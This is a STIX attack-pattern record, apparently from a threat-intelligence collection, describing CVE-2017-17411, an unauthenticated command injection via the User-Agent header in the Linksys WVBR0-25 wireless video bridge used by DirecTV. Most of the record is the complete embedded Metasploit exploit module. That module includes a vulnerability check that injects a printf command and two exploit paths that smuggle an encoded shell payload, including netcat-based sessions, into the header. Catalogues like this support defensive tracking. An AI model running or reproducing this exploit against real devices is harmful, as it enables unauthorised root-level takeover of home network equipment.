{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--18f229d0-4e4d-4c28-98d7-02593093c357",
    "created": "2024-08-14T17:00:29.194037Z",
    "modified": "2024-08-14T17:00:29.19404Z",
    "name": "Linksys WVBR0-25 User-Agent Command Execution",
    "description": " The Linksys WVBR0-25 Wireless Video Bridge, used by DirecTV to connect wireless Genie cable boxes to the Genie DVR, is vulnerable to OS command injection in version < 1.0.41 of the web management portal via the User-Agent header. Authentication is not required to exploit this vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/linksys_wvbr0_user_agent_exec_noauth.rb",
            "external_id": "linksys_wvbr0_user_agent_exec_noauth.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-17411"
        },
        {
            "source_name": "reference",
            "url": "https://www.thezdi.com/blog/2017/12/13/remote-root-in-directvs-wireless-video-bridge-a-tale-of-rage-and-despair"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Linksys WVBR0-25 User-Agent Command Execution',\n      'Description' => %q{\n        The Linksys WVBR0-25 Wireless Video Bridge, used by DirecTV to connect wireless Genie\n        cable boxes to the Genie DVR, is vulnerable to OS command injection in version < 1.0.41\n        of the web management portal via the User-Agent header. Authentication is not required to\n        exploit this vulnerability.\n      },\n      'Author'      =>\n        [\n          'HeadlessZeke' # Vulnerability discovery and Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2017-17411'],\n          ['ZDI', '17-973'],\n          ['URL', 'https://www.thezdi.com/blog/2017/12/13/remote-root-in-directvs-wireless-video-bridge-a-tale-of-rage-and-despair']\n        ],\n      'DisclosureDate' => '2017-12-13',\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 1024,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic netcat'\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DefaultTarget'  => 0\n      ))\n  end\n\n  def check\n    check_str = rand_text_alpha(8)\n    begin\n      res = send_request_raw({\n        'method' => 'GET',\n        'uri' => '/',\n        'agent' => \"\\\"; printf \\\"#{check_str}\"\n      })\n      if res && res.code == 200 && res.body.to_s.include?(Rex::Text.md5(check_str))\n        return Exploit::CheckCode::Vulnerable\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"#{peer} - Trying to access the device ...\")\n\n    unless check == Exploit::CheckCode::Vulnerable\n      fail_with(Failure::NotVulnerable, \"#{peer} - Failed to access the vulnerable device\")\n    end\n\n    print_status(\"#{peer} - Exploiting...\")\n\n    if datastore['PAYLOAD'] == 'cmd/unix/generic'\n      exploit_cmd\n    else\n      exploit_session\n    end\n  end\n\n  def exploit_cmd\n    beg_boundary = rand_text_alpha(8)\n\n    begin\n      res = send_request_raw({\n        'method' => 'GET',\n        'uri'    => '/',\n        'agent' => \"\\\"; echo #{beg_boundary}; #{payload.encoded} #\"\n      })\n\n      if res && res.code == 200 && res.body.to_s =~ /#{beg_boundary}/\n        print_good(\"#{peer} - Command sent successfully\")\n        if res.body.to_s =~ /ret :.+?#{beg_boundary}(.*)/  # all output ends up on one line\n          print_status(\"#{peer} - Command output: #{$1}\")\n        end\n      else\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Command execution failed\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\n\n  def exploit_session\n    begin\n      send_request_raw({\n        'method' => 'GET',\n        'uri'    => '/',\n        'agent' => \"\\\"; #{payload.encoded} #\"\n      })\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-12-13",
    "x_mitre_platforms": [
        "unix'"
    ]
}